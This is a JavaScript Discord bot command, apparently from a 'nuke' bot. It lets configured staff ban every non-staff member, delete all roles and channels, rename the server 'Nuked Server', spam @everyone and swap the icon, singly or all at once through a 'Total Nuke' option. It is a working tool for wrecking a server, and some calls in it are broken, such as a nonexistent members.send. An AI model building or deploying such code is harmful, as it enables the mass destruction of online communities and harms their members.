const { ButtonStyle, EmbedBuilder, ActionRowBuilder, StringSelectMenuBuilder, ButtonBuilder } = require('discord.js'); // Assurez-vous de bien importer StringSelectMenuBuilder
const config = require('../../Client/config');

module.exports = {
    name: 'nuke',
    description: 'Nuke the server with powerful options.',
    async execute(message) {
        // Vérification des permissions
        const staffIds = config.staff;

        // Si l'utilisateur n'est pas un administrateur autorisé, ignore le message sans réponse
        if (!staffIds.includes(message.author.id)) {
            return; // On ignore le message sans rien dire
        }

        // Embed de confirmation avec des options
        const confirmationEmbed = new EmbedBuilder()
            .setColor(config.color)
            .setDescription('⚠️ **Please select the actions you want to activate for the nuke**.\n\nSelect the actions below.')
            .setFooter({ text: config.footer });

        // Créer un menu déroulant avec plusieurs options (multiple sélection activée)
        const selectMenu = new StringSelectMenuBuilder() 
            .setCustomId('nuke_select')
            .setPlaceholder('Choose actions to activate')
            .setMinValues(1)  // L'utilisateur doit choisir au moins une option
            .setMaxValues(10)  // L'utilisateur peut choisir jusqu’à 10 options
            .setOptions([  // Utilise .setOptions pour définir les options
                {
                    label: 'Ban All Members',
                    value: 'ban_all',
                    description: 'Ban all members except staff members',
                    emoji: '🔨'
                },
                {
                    label: 'Delete Roles',
                    value: 'delete_roles',
                    description: 'Delete all roles except default ones',
                    emoji: '⚔️'
                },
                {
                    label: 'Create Channels',
                    value: 'create_channels',
                    description: 'Create new channels for the nuke',
                    emoji: '📢'
                },
                {
                    label: 'Delete Channels',
                    value: 'delete_channels',
                    description: 'Delete all channels except default ones',
                    emoji: '🗑️'
                },
                {
                    label: 'Delete Voice Channels',
                    value: 'delete_vcs',
                    description: 'Delete all voice channels',
                    emoji: '🔊'
                },
                {
                    label: 'Change Server Name',
                    value: 'change_server_name',
                    description: 'Change the server name to something inappropriate',
                    emoji: '📝'
                },
                {
                    label: 'Ping Everyone',
                    value: 'ping_everyone',
                    description: 'Ping everyone (@everyone)',
                    emoji: '📣'
                },
                {
                    label: 'Change Server Icon',
                    value: 'change_server_icon',
                    description: 'Change the server icon to something else',
                    emoji: '🖼️'
                },
                {
                    label: 'Total Nuke (All Options)',
                    value: 'total_nuke',
                    description: 'Activate all destructive actions at once',
                    emoji: '💥'
                }
            ]);

        // Créer un bouton pour confirmer l'action
        const confirmButton = new ButtonBuilder()
            .setCustomId('confirm_nuke')
            .setLabel('Confirm Nuke')
            .setStyle(ButtonStyle.Danger);

        // Envoyer le message avec le menu déroulant et le bouton
        const confirmationMessage = await message.reply({
            embeds: [confirmationEmbed],
            components: [
                new ActionRowBuilder().addComponents(selectMenu), // Ajouter le menu déroulant
                new ActionRowBuilder().addComponents(confirmButton) // Ajouter le bouton
            ]
        });

        // Collecteur pour récupérer les réponses du menu déroulant et du bouton
        const filter = i => i.user.id === message.author.id;
        const collector = confirmationMessage.createMessageComponentCollector({ filter, time: 30000 });

        // Stocke les options sélectionnées
        let selectedOptions = {
            banAll: false,
            deleteRoles: false,
            createChannels: false,
            deleteChannels: false,
            deleteVCs: false,
            changeServerName: false,
            pingEveryone: false,
            changeServerIcon: false
        };

        collector.on('collect', async (interaction) => {
            // Gérer les interactions avec le menu déroulant
            if (interaction.isStringSelectMenu()) {
                const selectedValues = interaction.values; // Valeurs sélectionnées dans le menu déroulant

                // Si l'utilisateur choisit "Total Nuke", activer toutes les options
                if (selectedValues.includes('total_nuke')) {
                    selectedOptions = {
                        banAll: true,
                        deleteRoles: true,
                        createChannels: true,
                        deleteChannels: true,
                        deleteVCs: true,
                        changeServerName: true,
                        pingEveryone: true,
                        changeServerIcon: true
                    };
                } else {
                    // Mettre à jour les options activées/désactivées en fonction des choix
                    selectedOptions.banAll = selectedValues.includes('ban_all');
                    selectedOptions.deleteRoles = selectedValues.includes('delete_roles');
                    selectedOptions.createChannels = selectedValues.includes('create_channels');
                    selectedOptions.deleteChannels = selectedValues.includes('delete_channels');
                    selectedOptions.deleteVCs = selectedValues.includes('delete_vcs');
                    selectedOptions.changeServerName = selectedValues.includes('change_server_name');
                    selectedOptions.pingEveryone = selectedValues.includes('ping_everyone');
                    selectedOptions.changeServerIcon = selectedValues.includes('change_server_icon');
                }

                // Mettre à jour l'embed pour afficher les options activées
                const updatedEmbed = new EmbedBuilder()
                    .setColor(config.color)
                    .setDescription('⚠️ **Current selected actions:**\n' +
                        `- Ban All: ${selectedOptions.banAll ? 'Enabled' : 'Disabled'}\n` +
                        `- Delete Roles: ${selectedOptions.deleteRoles ? 'Enabled' : 'Disabled'}\n` +
                        `- Create Channels: ${selectedOptions.createChannels ? 'Enabled' : 'Disabled'}\n` +
                        `- Delete Channels: ${selectedOptions.deleteChannels ? 'Enabled' : 'Disabled'}\n` +
                        `- Delete Voice Channels: ${selectedOptions.deleteVCs ? 'Enabled' : 'Disabled'}\n` +
                        `- Change Server Name: ${selectedOptions.changeServerName ? 'Enabled' : 'Disabled'}\n` +
                        `- Ping Everyone: ${selectedOptions.pingEveryone ? 'Enabled' : 'Disabled'}\n` +
                        `- Change Server Icon: ${selectedOptions.changeServerIcon ? 'Enabled' : 'Disabled'}`)
                    .setFooter({ text: config.footer });

                await interaction.update({
                    embeds: [updatedEmbed],
                    components: [
                        new ActionRowBuilder().addComponents(selectMenu),
                        new ActionRowBuilder().addComponents(confirmButton) // Réajouter le bouton
                    ]
                });
            }

            // Gérer l'interaction avec le bouton
            if (interaction.isButton() && interaction.customId === 'confirm_nuke') {
                // Exécuter les actions sélectionnées
                if (selectedOptions.banAll) {
                    await message.guild.members.fetch().then(members => {
                        members.forEach(member => {
                            if (!staffIds.includes(member.id)) {
                                member.ban({ reason: 'Nuke: Banned all non-staff members' });
                            }
                        });
                    });
                }

                if (selectedOptions.deleteRoles) {
                    message.guild.roles.cache.forEach(role => {
                        if (role.name !== '@everyone') {
                            role.delete({ reason: 'Nuke: Deleted all roles' });
                        }
                    });
                }

                if (selectedOptions.createChannels) {
                    await message.guild.channels.create({
                        name: 'Nuke Channel',
                        type: 0,
                        reason: 'Nuke: Created new channel'
                    });
                }

                if (selectedOptions.deleteChannels) {
                    message.guild.channels.cache.forEach(channel => {
                        if (channel.name !== 'general') {
                            channel.delete({ reason: 'Nuke: Deleted channel' });
                        }
                    });
                }

                if (selectedOptions.deleteVCs) {
                    message.guild.channels.cache.filter(c => c.type === 2).forEach(vc => {
                        vc.delete({ reason: 'Nuke: Deleted voice channel' });
                    });
                }

                if (selectedOptions.changeServerName) {
                    await message.guild.setName('Nuked Server', 'Server renamed as part of nuke');
                }

                if (selectedOptions.pingEveryone) {
                    await message.guild.members.send('@everyone NUKED!');
                }

                if (selectedOptions.changeServerIcon) {
                    await message.guild.setIcon('https://example.com/nuke-icon.png');
                }

                // Envoyer un message de confirmation
                await interaction.update({
                    content: 'The nuke actions have been executed!',
                    embeds: [],
                    components: []
                });
            }
        });

        collector.on('end', async () => {
            // Si le temps est écoulé, désactiver toutes les options
            await confirmationMessage.edit({
                content: 'You took too long to select actions. The nuke has been canceled.',
                embeds: [],
                components: []
            });
        });
    }
};
